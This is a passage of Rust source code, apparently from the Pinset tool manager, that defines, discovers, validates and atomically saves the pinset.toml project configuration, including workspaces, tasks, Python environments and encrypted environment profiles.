use std::{
    collections::BTreeMap,
    env, fs,
    path::{Path, PathBuf},
};

#[cfg(feature = "project-write")]
use atomic_write_file::AtomicWriteFile;
use serde::{Deserialize, Serialize};
#[cfg(feature = "project-write")]
use std::io::Write;

use crate::{Error, MinimumReleaseAge, PYTHON_ENVIRONMENT_DIR, Result, VerificationStrength};

#[cfg(feature = "lockfile")]
use crate::Lockfile;
#[cfg(all(feature = "project-write", feature = "lockfile"))]
use crate::{
    acquire_project_state_write_lock, lockfile_path, register_project_config, save_lockfile,
    validate_lock_matches_tool_options, validate_lock_matches_tools,
};

pub const PROJECT_CONFIG_FILENAME: &str = "pinset.toml";
pub const PROJECT_CONFIG_SCHEMA: u32 = 5;
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProjectConfig {
    pub schema: u32,
    #[serde(
        default,
        rename = "project-id",
        skip_serializing_if = "Option::is_none"
    )]
    pub project_id: Option<String>,
    #[serde(default)]
    pub policy: ProjectPolicy,
    #[serde(default)]
    pub tools: BTreeMap<String, String>,
    /// Identity-affecting options for a configured tool. Plain string selections remain valid.
    #[serde(
        default,
        rename = "tool-options",
        skip_serializing_if = "BTreeMap::is_empty"
    )]
    pub tool_options: BTreeMap<String, ToolOptions>,
    #[serde(default)]
    pub tasks: BTreeMap<String, ProjectTask>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub python: Option<ProjectPython>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<ProjectWorkspace>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub environment: Option<ProjectEnvironment>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ToolOptions {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub profile: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub components: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub targets: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub date: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub distribution: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub package: Option<String>,
}

impl ToolOptions {
    pub fn lock_options(&self) -> BTreeMap<String, String> {
        let mut options = BTreeMap::new();
        if let Some(value) = &self.profile {
            options.insert("profile".to_owned(), value.clone());
        }
        if !self.components.is_empty() {
            let mut values = self.components.clone();
            values.sort();
            options.insert("components".to_owned(), values.join(","));
        }
        if !self.targets.is_empty() {
            let mut values = self.targets.clone();
            values.sort();
            options.insert("targets".to_owned(), values.join(","));
        }
        if let Some(value) = &self.date {
            options.insert("date".to_owned(), value.clone());
        }
        if let Some(value) = &self.distribution {
            options.insert("distribution".to_owned(), value.clone());
        }
        if let Some(value) = &self.package {
            options.insert("package".to_owned(), value.clone());
        }
        options
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "kebab-case")]
pub enum EnvironmentCollision {
    #[default]
    Error,
    ProcessWins,
    EncryptedWins,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ProjectEnvironment {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auto_profile: Option<String>,
    #[serde(default)]
    pub collision: EnvironmentCollision,
    #[serde(default)]
    pub profiles: BTreeMap<String, EnvironmentProfile>,
    #[serde(default)]
    pub variables: BTreeMap<String, EnvironmentVariableContract>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ProjectTask {
    pub command: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cwd: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub profile: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub python_environment: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ProjectPython {
    #[serde(default)]
    pub environments: BTreeMap<String, ProjectPythonEnvironmentConfig>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ProjectPythonEnvironmentConfig {
    pub path: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct ProjectWorkspace {
    pub members: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorkspaceMember {
    pub name: String,
    pub root: PathBuf,
    pub config_path: PathBuf,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum EnvironmentVariableType {
    String,
    Integer,
    Boolean,
    Url,
    Enum,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct EnvironmentVariableContract {
    #[serde(rename = "type", default = "default_variable_type")]
    pub kind: EnvironmentVariableType,
    #[serde(default)]
    pub required: bool,
    #[serde(default)]
    pub secret: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub default: Option<String>,
    #[serde(default)]
    pub profiles: Vec<String>,
    #[serde(default)]
    pub values: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
}

const fn default_variable_type() -> EnvironmentVariableType {
    EnvironmentVariableType::String
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case", deny_unknown_fields)]
pub struct EnvironmentProfile {
    pub file: String,
    pub recipients: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum ProjectBoundary {
    #[default]
    Git,
    Filesystem,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "kebab-case", deny_unknown_fields)]
pub struct ProjectPolicy {
    pub inherit_global: bool,
    pub system_fallback: bool,
    pub boundary: ProjectBoundary,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub verification_strength: Option<VerificationStrength>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub minimum_release_age: Option<MinimumReleaseAge>,
}

impl Default for ProjectPolicy {
    fn default() -> Self {
        Self {
            inherit_global: false,
            system_fallback: false,
            boundary: ProjectBoundary::Git,
            verification_strength: None,
            minimum_release_age: None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProjectContext {
    pub start: PathBuf,
    pub boundary: PathBuf,
    pub config_path: Option<PathBuf>,
}

impl ProjectConfig {
    pub fn set_tool(&mut self, tool: &str, version: &str) {
        self.tools.insert(tool.to_owned(), version.to_owned());
    }
}

pub fn find_project_config(start: &Path) -> Result<PathBuf> {
    let context = find_project_context(start)?;
    context
        .config_path
        .ok_or_else(|| Error::ProjectConfigNotFound {
            start: context.start,
        })
}

pub fn find_optional_project_config(start: &Path) -> Result<Option<PathBuf>> {
    Ok(find_project_context(start)?.config_path)
}

pub fn find_project_context(start: &Path) -> Result<ProjectContext> {
    let start = normalized_search_start(start);
    let start = if start.is_absolute() {
        start.to_path_buf()
    } else {
        env::current_dir()
            .map_err(|source| Error::ReadProjectConfig {
                path: start.to_path_buf(),
                source,
            })?
            .join(start)
    };
    let default_boundary = nearest_git_root(&start).unwrap_or_else(|| start.clone());

    for directory in ancestors_through(&start, &default_boundary) {
        let candidate = directory.join(PROJECT_CONFIG_FILENAME);
        if candidate.is_file() {
            let config = load_project_config(&candidate)?;
            let boundary = if config.policy.boundary == ProjectBoundary::Filesystem {
                filesystem_root(&start)
            } else {
                default_boundary.clone()
            };
            return Ok(ProjectContext {
                start: start.clone(),
                boundary,
                config_path: Some(candidate),
            });
        }
    }

    // A configuration above the normal Git/home boundary is considered only when it explicitly
    // opts into filesystem-wide discovery. This preserves an escape hatch without allowing an
    // unrelated parent configuration to silently capture a repository.
    let mut above_boundary = false;
    for directory in start.ancestors() {
        if !above_boundary {
            if directory == default_boundary {
                above_boundary = true;
            }
            continue;
        }
        let candidate = directory.join(PROJECT_CONFIG_FILENAME);
        if candidate.is_file() {
            let config = load_project_config(&candidate)?;
            if config.policy.boundary == ProjectBoundary::Filesystem {
                return Ok(ProjectContext {
                    start: start.clone(),
                    boundary: filesystem_root(&start),
                    config_path: Some(candidate),
                });
            }
            break;
        }
    }

    Ok(ProjectContext {
        start,
        boundary: default_boundary,
        config_path: None,
    })
}

fn normalized_search_start(start: &Path) -> &Path {
    if start.is_file() {
        start.parent().unwrap_or(start)
    } else {
        start
    }
}

fn nearest_git_root(start: &Path) -> Option<PathBuf> {
    start
        .ancestors()
        .find(|directory| {
            let marker = directory.join(".git");
            marker.is_file() || marker.is_dir()
        })
        .map(Path::to_path_buf)
}

fn filesystem_root(start: &Path) -> PathBuf {
    start.ancestors().last().unwrap_or(start).to_path_buf()
}

fn ancestors_through<'a>(start: &'a Path, boundary: &'a Path) -> impl Iterator<Item = &'a Path> {
    start
        .ancestors()
        .take_while(move |directory| directory.starts_with(boundary))
}

pub fn load_project_config(path: &Path) -> Result<ProjectConfig> {
    let config = parse_project_config(path)?;
    effective_project_config(path, &config)?;
    Ok(config)
}

fn parse_project_config(path: &Path) -> Result<ProjectConfig> {
    let content = fs::read_to_string(path).map_err(|source| Error::ReadProjectConfig {
        path: path.to_path_buf(),
        source,
    })?;
    let config: ProjectConfig =
        toml::from_str(&content).map_err(|source| Error::ParseProjectConfig {
            path: path.to_path_buf(),
            source,
        })?;

    if !matches!(config.schema, 1 | 2 | 3 | 4 | PROJECT_CONFIG_SCHEMA) {
        return Err(Error::UnsupportedSchema {
            actual: config.schema,
        });
    }

    Ok(config)
}

pub fn load_effective_project_config(path: &Path) -> Result<ProjectConfig> {
    let config = parse_project_config(path)?;
    effective_project_config(path, &config)
}

pub fn effective_project_config(path: &Path, member: &ProjectConfig) -> Result<ProjectConfig> {
    let Some((_, root)) = workspace_root_for_member(path)? else {
        validate_environment_config(member)?;
        return Ok(member.clone());
    };
    if member.workspace.is_some() {
        return Err(Error::InvalidProjectConfig {
            reason: "a workspace member cannot declare a nested workspace".to_owned(),
        });
    }
    let mut effective = root;
    effective.project_id = member.project_id.clone();
    effective.policy = member.policy.clone();
    for tool in member.tools.keys() {
        effective.tool_options.remove(tool);
    }
    effective.tools.extend(member.tools.clone());
    effective.tool_options.extend(member.tool_options.clone());
    effective.tasks.extend(member.tasks.clone());
    if member.python.is_some() {
        effective.python = member.python.clone();
    }
    if member.environment.is_some() {
        effective.environment = member.environment.clone();
    }
    effective.workspace = None;
    validate_environment_config(&effective)?;
    Ok(effective)
}

pub fn workspace_members(root_config_path: &Path) -> Result<Vec<WorkspaceMember>> {
    let root_config = parse_project_config(root_config_path)?;
    validate_environment_config(&root_config)?;
    let workspace = root_config
        .workspace
        .as_ref()
        .ok_or_else(|| Error::InvalidProjectConfig {
            reason: format!(
                "{} does not declare a workspace",
                root_config_path.display()
            ),
        })?;
    let root = root_config_path.parent().unwrap_or_else(|| Path::new("."));
    workspace
        .members
        .iter()
        .map(|name| {
            let member_root = root.join(name);
            let config_path = member_root.join(PROJECT_CONFIG_FILENAME);
            if !config_path.is_file() {
                return Err(Error::InvalidProjectConfig {
                    reason: format!("workspace member {name:?} has no {}", config_path.display()),
                });
            }
            Ok(WorkspaceMember {
                name: name.clone(),
                root: member_root,
                config_path,
            })
        })
        .collect()
}

pub fn find_workspace_config(start: &Path) -> Result<PathBuf> {
    let config_path = find_project_config(start)?;
    if parse_project_config(&config_path)?.workspace.is_some() {
        return Ok(config_path);
    }
    workspace_root_for_member(&config_path)?
        .map(|(path, _)| path)
        .ok_or_else(|| Error::InvalidProjectConfig {
            reason: format!(
                "{} is not part of a Pinset workspace",
                config_path.display()
            ),
        })
}

fn workspace_root_for_member(path: &Path) -> Result<Option<(PathBuf, ProjectConfig)>> {
    let member_root = path.parent().unwrap_or_else(|| Path::new("."));
    let canonical_member =
        fs::canonicalize(member_root).unwrap_or_else(|_| member_root.to_path_buf());
    let boundary = nearest_git_root(member_root).unwrap_or_else(|| filesystem_root(member_root));
    for ancestor in member_root
        .parent()
        .into_iter()
        .flat_map(Path::ancestors)
        .take_while(|ancestor| ancestor.starts_with(&boundary))
    {
        let candidate = ancestor.join(PROJECT_CONFIG_FILENAME);
        if !candidate.is_file() {
            continue;
        }
        let root = parse_project_config(&candidate)?;
        validate_environment_config(&root)?;
        let Some(workspace) = &root.workspace else {
            continue;
        };
        let matches = workspace.members.iter().any(|member| {
            let declared = ancestor.join(member);
            fs::canonicalize(&declared).unwrap_or(declared) == canonical_member
        });
        if matches {
            return Ok(Some((candidate, root)));
        }
    }
    Ok(None)
}

#[cfg(feature = "project-write")]
pub fn create_project_config(directory: &Path) -> Result<PathBuf> {
    let path = directory.join(PROJECT_CONFIG_FILENAME);
    let project_id = uuid::Uuid::new_v4();
    let content = format!(
        "schema = {PROJECT_CONFIG_SCHEMA}\nproject-id = \"{project_id}\"\n\n[policy]\ninherit-global = false\nsystem-fallback = false\nboundary = \"git\"\n\n[tools]\n"
    );
    let mut temporary = tempfile::Builder::new()
        .prefix(".pinset.toml.")
        .tempfile_in(directory)
        .map_err(|source| Error::WriteProjectConfig {
            path: path.clone(),
            source,
        })?;

    temporary
        .write_all(content.as_bytes())
        .and_then(|()| temporary.as_file().sync_all())
        .map_err(|source| Error::WriteProjectConfig {
            path: path.clone(),
            source,
        })?;

    match temporary.persist_noclobber(&path) {
        Ok(_) => Ok(path),
        Err(error) if error.error.kind() == std::io::ErrorKind::AlreadyExists => {
            Err(Error::ProjectConfigAlreadyExists { path })
        }
        Err(error) => Err(Error::WriteProjectConfig {
            path,
            source: error.error,
        }),
    }
}

#[cfg(feature = "project-write")]
pub fn save_project_config(path: &Path, config: &ProjectConfig) -> Result<()> {
    if !matches!(config.schema, 1 | 2 | 3 | 4 | PROJECT_CONFIG_SCHEMA) {
        return Err(Error::UnsupportedSchema {
            actual: config.schema,
        });
    }
    let mut normalized = config.clone();
    // Preserve schema 4 until the user explicitly runs `pinset migrate`. Schemas 1-3
    // keep the established automatic upgrade to schema 4 for compatibility.
    normalized.schema = if config.schema < 4 { 4 } else { config.schema };
    if normalized.project_id.is_none() {
        normalized.project_id = Some(uuid::Uuid::new_v4().to_string());
    }
    effective_project_config(path, &normalized)?;
    let serialized = serialize_project_config_preserving_comments(path, &normalized)?;
    let mut file =
        AtomicWriteFile::options()
            .open(path)
            .map_err(|source| Error::WriteProjectConfig {
                path: path.to_path_buf(),
                source,
            })?;
    file.write_all(serialized.as_bytes())
        .and_then(|()| file.commit())
        .map_err(|source| Error::WriteProjectConfig {
            path: path.to_path_buf(),
            source,
        })
}

fn validate_environment_config(config: &ProjectConfig) -> Result<()> {
    if config.schema < PROJECT_CONFIG_SCHEMA && !config.tasks.is_empty() {
        return Err(Error::InvalidProjectConfig {
            reason: "tasks require schema 5; run `pinset migrate`".to_owned(),
        });
    }
    if config.schema < PROJECT_CONFIG_SCHEMA && config.python.is_some() {
        return Err(Error::InvalidProjectConfig {
            reason: "named Python environments require schema 5; run `pinset migrate`".to_owned(),
        });
    }
    if config.schema < PROJECT_CONFIG_SCHEMA && config.workspace.is_some() {
        return Err(Error::InvalidProjectConfig {
            reason: "workspaces require schema 5; run `pinset migrate`".to_owned(),
        });
    }
    validate_tool_options(config)?;
    validate_workspace_config(config)?;
    if config.schema < 4 {
        if config.project_id.is_some() || config.environment.is_some() {
            return Err(Error::InvalidProjectConfig {
                reason: "project-id and environment require schema 4".to_owned(),
            });
        }
        return Ok(());
    }

    let project_id = config
        .project_id
        .as_deref()
        .ok_or_else(|| Error::InvalidProjectConfig {
            reason: format!("schema {} requires project-id", config.schema),
        })?;
    if !valid_project_id(project_id) {
        return Err(Error::InvalidProjectConfig {
            reason: "project-id must be a lowercase UUID".to_owned(),
        });
    }

    for (name, task) in &config.tasks {
        if !valid_task_name(name)
            || task.command.is_empty()
            || task.command.iter().any(String::is_empty)
        {
            return Err(Error::InvalidProjectConfig {
                reason: format!("task {name} requires a non-empty command array"),
            });
        }
        if let Some(cwd) = &task.cwd {
            let path = Path::new(cwd);
            if path.as_os_str().is_empty()
                || path.is_absolute()
                || path.components().any(|component| {
                    matches!(
                        component,
                        std::path::Component::ParentDir
                            | std::path::Component::RootDir
                            | std::path::Component::Prefix(_)
                    )
                })
            {
                return Err(Error::InvalidProjectConfig {
                    reason: format!("task {name} cwd must stay within the project"),
                });
            }
        }
    }
    validate_python_environments(config)?;
    let Some(environment) = &config.environment else {
        if let Some((name, _)) = config.tasks.iter().find(|(_, task)| task.profile.is_some()) {
            return Err(Error::InvalidProjectConfig {
                reason: format!(
                    "task {name} references an environment profile, but no environment is declared"
                ),
            });
        }
        return Ok(());
    };
    if config.schema < PROJECT_CONFIG_SCHEMA && !environment.variables.is_empty() {
        return Err(Error::InvalidProjectConfig {
            reason: "environment variable contracts require schema 5; run `pinset migrate`"
                .to_owned(),
        });
    }
    if let Some(profile) = &environment.auto_profile
        && !environment.profiles.contains_key(profile)
    {
        return Err(Error::InvalidProjectConfig {
            reason: format!("environment auto-profile {profile} is not declared"),
        });
    }
    for (name, profile) in &environment.profiles {
        if !valid_profile_name(name) {
            return Err(Error::InvalidProjectConfig {
                reason: format!("invalid environment profile name: {name}"),
            });
        }
        if profile.file.is_empty() || profile.file.len() > 4096 {
            return Err(Error::InvalidProjectConfig {
                reason: format!("environment profile {name} has an invalid file path"),
            });
        }
        if profile.recipients.is_empty() {
            return Err(Error::InvalidProjectConfig {
                reason: format!("environment profile {name} requires at least one recipient"),
            });
        }
        let mut recipients = std::collections::BTreeSet::new();
        for recipient in &profile.recipients {
            if !recipient.starts_with("age1") || !recipients.insert(recipient) {
                return Err(Error::InvalidProjectConfig {
                    reason: format!(
                        "environment profile {name} has an invalid or duplicate recipient"
                    ),
                });
            }
        }
    }
    for (name, contract) in &environment.variables {
        if !valid_environment_variable_name(name) {
            return Err(Error::InvalidProjectConfig {
                reason: format!("invalid environment variable name: {name}"),
            });
        }
        if contract.secret && contract.default.is_some() {
            return Err(Error::InvalidProjectConfig {
                reason: format!("secret variable {name} cannot declare a default"),
            });
        }
        if contract.kind == EnvironmentVariableType::Enum && contract.values.is_empty() {
            return Err(Error::InvalidProjectConfig {
                reason: format!("enum variable {name} requires values"),
            });
        }
        if contract.kind != EnvironmentVariableType::Enum && !contract.values.is_empty() {
            return Err(Error::InvalidProjectConfig {
                reason: format!("only enum variable {name} may declare values"),
            });
        }
        for profile in &contract.profiles {
            if !environment.profiles.contains_key(profile) {
                return Err(Error::InvalidProjectConfig {
                    reason: format!("variable {name} references undeclared profile {profile}"),
                });
            }
        }
        if let Some(value) = &contract.default {
            validate_environment_variable_value(name, contract, value)?;
        }
    }
    for (name, task) in &config.tasks {
        if let Some(profile) = &task.profile
            && !environment.profiles.contains_key(profile)
        {
            return Err(Error::InvalidProjectConfig {
                reason: format!("task {name} references undeclared profile {profile}"),
            });
        }
    }
    Ok(())
}

fn validate_workspace_config(config: &ProjectConfig) -> Result<()> {
    let Some(workspace) = &config.workspace else {
        return Ok(());
    };
    if workspace.members.is_empty() {
        return Err(Error::InvalidProjectConfig {
            reason: "workspace.members must declare at least one member".to_owned(),
        });
    }
    let mut members = std::collections::BTreeSet::new();
    for member in &workspace.members {
        let components = member.split('/').collect::<Vec<_>>();
        if member.contains(['\\', ':'])
            || components
                .iter()
                .any(|component| component.is_empty() || matches!(*component, "." | ".."))
            || !members.insert(member.to_ascii_lowercase())
        {
            return Err(Error::InvalidProjectConfig {
                reason: format!(
                    "workspace member {member:?} must be a unique portable project-relative path"
                ),
            });
        }
    }
    Ok(())
}

fn validate_python_environments(config: &ProjectConfig) -> Result<()> {
    let declared = config.python.as_ref().map(|python| &python.environments);
    if declared.is_some_and(|environments| !environments.is_empty())
        && !config.tools.contains_key("python")
    {
        return Err(Error::InvalidProjectConfig {
            reason: "python environments require tools.python".to_owned(),
        });
    }
    let mut paths = std::collections::BTreeSet::from([PYTHON_ENVIRONMENT_DIR.to_owned()]);
    if let Some(environments) = declared {
        for (name, environment) in environments {
            if name == "default" || !valid_task_name(name) {
                return Err(Error::InvalidProjectConfig {
                    reason: format!(
                        "invalid Python environment name {name:?}; default is reserved for .venv"
                    ),
                });
            }
            let path = Path::new(&environment.path);
            let components = environment
                .path
                .split('/')
                .map(str::to_ascii_lowercase)
                .collect::<Vec<_>>();
            let portable_path = components.join("/");
            if path.as_os_str().is_empty()
                || path.is_absolute()
                || environment.path.contains(['\\', ':'])
                || components.iter().any(|component| {
                    component.is_empty() || matches!(component.as_str(), "." | "..")
                })
                || !paths.insert(portable_path)
            {
                return Err(Error::InvalidProjectConfig {
                    reason: format!(
                        "Python environment {name} path must be unique and stay within the project"
                    ),
                });
            }
        }
    }
    for (name, task) in &config.tasks {
        let Some(environment_name) = task.python_environment.as_deref() else {
            continue;
        };
        if environment_name != "default"
            && declared.is_none_or(|environments| !environments.contains_key(environment_name))
        {
            return Err(Error::InvalidProjectConfig {
                reason: format!(
                    "task {name} references undeclared Python environment {environment_name}"
                ),
            });
        }
        if !config.tools.contains_key("python") {
            return Err(Error::InvalidProjectConfig {
                reason: format!("task {name} binds a Python environment without tools.python"),
            });
        }
    }
    Ok(())
}

fn validate_tool_options(config: &ProjectConfig) -> Result<()> {
    for (tool, options) in &config.tool_options {
        if !config.tools.contains_key(tool) {
            return Err(Error::InvalidProjectConfig {
                reason: format!("tool-options.{tool} requires tools.{tool}"),
            });
        }
        for values in [&options.components, &options.targets] {
            let unique = values.iter().collect::<std::collections::BTreeSet<_>>();
            if unique.len() != values.len() || values.iter().any(|value| value.trim().is_empty()) {
                return Err(Error::InvalidProjectConfig {
                    reason: format!("tool-options.{tool} contains empty or duplicate values"),
                });
            }
        }
        match tool.as_str() {
            "rust" => {
                if options
                    .profile
                    .as_deref()
                    .is_some_and(|value| !matches!(value, "minimal" | "default" | "complete"))
                {
                    return Err(Error::InvalidProjectConfig {
                        reason: "Rust profile must be minimal, default or complete".to_owned(),
                    });
                }
                if options.distribution.is_some() || options.package.is_some() {
                    return Err(Error::InvalidProjectConfig {
                        reason: "Rust tool options do not accept distribution or package"
                            .to_owned(),
                    });
                }
                if options.date.as_deref().is_some_and(|date| {
                    let bytes = date.as_bytes();
                    bytes.len() != 10
                        || bytes[4] != b'-'
                        || bytes[7] != b'-'
                        || bytes
                            .iter()
                            .enumerate()
                            .any(|(index, byte)| index != 4 && index != 7 && !byte.is_ascii_digit())
                }) {
                    return Err(Error::InvalidProjectConfig {
                        reason: "Rust nightly date must use YYYY-MM-DD".to_owned(),
                    });
                }
            }
            "java" => {
                if options
                    .distribution
                    .as_deref()
                    .is_some_and(|value| value != "temurin")
                {
                    return Err(Error::InvalidProjectConfig {
                        reason: "Java distribution must be temurin".to_owned(),
                    });
                }
                if options
                    .package
                    .as_deref()
                    .is_some_and(|value| !matches!(value, "jdk" | "jre"))
                {
                    return Err(Error::InvalidProjectConfig {
                        reason: "Java package must be jdk or jre".to_owned(),
                    });
                }
                if options.profile.is_some()
                    || options.date.is_some()
                    || !options.components.is_empty()
                    || !options.targets.is_empty()
                {
                    return Err(Error::InvalidProjectConfig {
                        reason: "Java tool options accept only distribution and package".to_owned(),
                    });
                }
            }
            _ if options != &ToolOptions::default() => {
                return Err(Error::InvalidProjectConfig {
                    reason: format!("tool-options.{tool} is not supported"),
                });
            }
            _ => {}
        }
    }
    Ok(())
}

#[cfg(feature = "project-write")]
fn serialize_project_config_preserving_comments(
    path: &Path,
    normalized: &ProjectConfig,
) -> Result<String> {
    if let Ok(original) = fs::read_to_string(path)
        && let Ok(mut existing) = toml::from_str::<ProjectConfig>(&original)
    {
        let add_project_id = existing.project_id.is_none();
        existing.schema = normalized.schema;
        existing.project_id.clone_from(&normalized.project_id);
        if existing == *normalized {
            return Ok(rewrite_schema_header(
                &original,
                normalized.schema,
                add_project_id.then_some(
                    normalized
                        .project_id
                        .as_deref()
                        .expect("normalized project config has a project-id"),
                ),
            ));
        }
    }
    toml::to_string_pretty(normalized).map_err(|source| Error::SerializeProjectConfig { source })
}

#[cfg(feature = "project-write")]
fn rewrite_schema_header(original: &str, schema: u32, project_id: Option<&str>) -> String {
    let mut rewritten = String::with_capacity(original.len() + 64);
    let mut replaced = false;
    for line in original.split_inclusive('\n') {
        if !replaced {
            let leading = line.len() - line.trim_start().len();
            let candidate = &line[leading..];
            if let Some(after_name) = candidate.strip_prefix("schema") {
                let whitespace = after_name.len() - after_name.trim_start().len();
                if after_name[whitespace..].starts_with('=') {
                    let equals = leading + "schema".len() + whitespace;
                    let after_equals = equals + 1;
                    let value_start = after_equals + line[after_equals..].len()
                        - line[after_equals..].trim_start().len();
                    let value_end = value_start
                        + line[value_start..]
                            .bytes()
                            .take_while(|byte| byte.is_ascii_digit())
                            .count();
                    rewritten.push_str(&line[..value_start]);
                    rewritten.push_str(&schema.to_string());
                    rewritten.push_str(&line[value_end..]);
                    if let Some(project_id) = project_id {
                        if !line.ends_with('\n') {
                            rewritten.push('\n');
                        }
                        rewritten.push_str(&format!("project-id = \"{project_id}\"\n"));
                    }
                    replaced = true;
                    continue;
                }
            }
        }
        rewritten.push_str(line);
    }
    if replaced {
        rewritten
    } else {
        format!("schema = {schema}\n{rewritten}")
    }
}

pub fn validate_environment_variable_value(
    name: &str,
    contract: &EnvironmentVariableContract,
    value: &str,
) -> Result<()> {
    let valid = match contract.kind {
        EnvironmentVariableType::String => true,
        EnvironmentVariableType::Integer => value.parse::<i64>().is_ok(),
        EnvironmentVariableType::Boolean => matches!(value, "true" | "false"),
        EnvironmentVariableType::Url => url::Url::parse(value).is_ok_and(|url| url.has_host()),
        EnvironmentVariableType::Enum => contract.values.iter().any(|candidate| candidate == value),
    };
    if valid {
        Ok(())
    } else {
        Err(Error::InvalidProjectConfig {
            reason: format!("variable {name} does not match its declared type"),
        })
    }
}

fn valid_environment_variable_name(name: &str) -> bool {
    let mut bytes = name.bytes();
    bytes
        .next()
        .is_some_and(|byte| byte.is_ascii_alphabetic() || byte == b'_')
        && bytes.all(|byte| byte.is_ascii_alphanumeric() || byte == b'_')
        && !name.eq_ignore_ascii_case("PATH")
        && !name.to_ascii_uppercase().starts_with("PINSET_")
}

fn valid_task_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
}

fn valid_profile_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 64
        && name
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-'))
}

fn valid_project_id(value: &str) -> bool {
    value.len() == 36
        && value.bytes().enumerate().all(|(index, byte)| match index {
            8 | 13 | 18 | 23 => byte == b'-',
            _ => byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte),
        })
}

#[cfg(all(feature = "project-write", feature = "lockfile"))]
pub fn save_project_state(
    pinset_home: &Path,
    path: &Path,
    config: &ProjectConfig,
    lockfile: &Lockfile,
) -> Result<()> {
    let _guard = acquire_project_state_write_lock(pinset_home, path)?;
    save_project_state_locked(pinset_home, path, config, lockfile)
}

#[cfg(all(feature = "project-write", feature = "lockfile"))]
pub fn save_project_state_locked(
    pinset_home: &Path,
    path: &Path,
    config: &ProjectConfig,
    lockfile: &Lockfile,
) -> Result<()> {
    let effective = effective_project_config(path, config)?;
    crate::validate_provider_selections(&effective.tools)?;
    validate_lock_matches_tools(lockfile, &effective.tools, path)?;
    validate_lock_matches_tool_options(lockfile, &effective.tool_options, path)?;
    validate_project_lock_policy(&effective, lockfile, std::time::SystemTime::now())?;
    register_project_config(pinset_home, path)?;

    // Commit the lock first. If the second atomic write is interrupted, the previous
    // selection remains active and lock-dependent operations fail until this is retried.
    let lock_path = lockfile_path(path);
    let previous_lock = match fs::read(&lock_path) {
        Ok(content) => Some(content),
        Err(source) if source.kind() == std::io::ErrorKind::NotFound => None,
        Err(source) => {
            return Err(Error::ReadLockfile {
                path: lock_path,
                source,
            });
        }
    };
    save_lockfile(&lock_path, lockfile)?;
    if let Err(commit_error) = save_project_config(path, config) {
        if let Err(rollback_error) = restore_previous_lock(&lock_path, previous_lock.as_deref()) {
            return Err(Error::StateCommitRollbackFailed {
                scope: "project",
                path: path.to_path_buf(),
                commit_error: commit_error.to_string(),
                rollback_error: rollback_error.to_string(),
            });
        }
        return Err(commit_error);
    }
    Ok(())
}

#[cfg(all(feature = "project-write", feature = "lockfile"))]
fn restore_previous_lock(path: &Path, previous: Option<&[u8]>) -> Result<()> {
    if let Some(previous) = previous {
        let mut file =
            AtomicWriteFile::options()
                .open(path)
                .map_err(|source| Error::WriteLockfile {
                    path: path.to_path_buf(),
                    source,
                })?;
        return file
            .write_all(previous)
            .and_then(|()| file.commit())
            .map_err(|source| Error::WriteLockfile {
                path: path.to_path_buf(),
                source,
            });
    }
    match fs::remove_file(path) {
        Ok(()) => Ok(()),
        Err(source) if source.kind() == std::io::ErrorKind::NotFound => Ok(()),
        Err(source) => Err(Error::WriteLockfile {
            path: path.to_path_buf(),
            source,
        }),
    }
}

#[cfg(feature = "lockfile")]
pub fn validate_project_lock_policy(
    config: &ProjectConfig,
    lockfile: &Lockfile,
